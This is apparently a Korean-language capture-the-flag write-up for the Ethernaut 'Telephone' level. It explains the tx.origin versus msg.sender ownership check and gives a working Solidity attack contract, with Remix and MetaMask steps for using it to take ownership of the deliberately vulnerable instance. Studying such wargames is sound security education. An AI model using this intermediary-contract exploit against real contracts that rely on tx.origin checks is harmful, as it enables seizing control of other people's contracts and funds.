# Ethernaut Level 4 - Telephone

## 문제 설명

Telephone 컨트랙트는 `changeOwner` 함수를 통해 소유권을 변경할 수 있다.  
하지만 `tx.origin != msg.sender` 조건이 걸려 있어  
직접 호출로는 소유권을 가져올 수 없는 구조이다.

---

## 컨트랙트 분석

```solidity
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

---

## 취약점 분석

### 1. tx.origin vs msg.sender

```solidity
if (tx.origin != msg.sender) {
    owner = _owner;
}
```

| 변수 | 의미 |
|---|---|
| `tx.origin` | 트랜잭션을 최초 시작한 EOA 주소 (항상 사람 지갑) |
| `msg.sender` | 나를 직접 호출한 주소 (컨트랙트일 수도 있음) |

---

### 2. 직접 호출 시 문제

```
내 지갑 → Telephone.changeOwner()

tx.origin  = 내 지갑
msg.sender = 내 지갑  ← 둘이 같음 → 조건 false → 실패
```

내가 직접 호출하면 두 값이 항상 동일하므로 조건을 절대 만족할 수 없다.

---

### 3. 공격 가능성

중간 컨트랙트를 통해 호출하면:

```
내 지갑 → AttackContract → Telephone.changeOwner()

tx.origin  = 내 지갑
msg.sender = AttackContract  ← 둘이 다름 → 조건 true → 성공
```

`msg.sender`가 컨트랙트 주소로 바뀌면서 조건을 만족한다.

---

## 공격 전략

1. 중간 컨트랙트를 배포한다
2. 중간 컨트랙트를 통해 `changeOwner`를 호출한다
3. `tx.origin != msg.sender` 조건을 만족시켜 소유권을 탈취한다

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    function attack(address _telephoneAddress, address _newOwner) public {
        ITelephone(_telephoneAddress).changeOwner(_newOwner);
    }
}
```

---

## 공격 단계

### Step 1 — Remix 접속 및 컨트랙트 작성

Remix IDE에서 공격 컨트랙트를 작성하고 컴파일한다.

---

### Step 2 — 컨트랙트 배포

- Environment: `Injected Provider - MetaMask`
- 네트워크: Ethernaut와 동일 (Sepolia 등)
- Deploy 클릭 후 MetaMask 승인

---

### Step 3 — attack 실행

Deployed Contracts에서 `attack` 함수에 아래 값 입력:

```
_telephoneAddress : Ethernaut Telephone 인스턴스 주소
_newOwner         : 내 MetaMask 지갑 주소
```

인스턴스 주소 확인:
```js
contract.address
```

transact 클릭 후 MetaMask 승인

---

### Step 4 — 상태 확인

Ethernaut 콘솔에서 소유권 변경 확인:

```js
await contract.owner()
// → 내 지갑 주소로 변경되어 있으면 성공
```

---


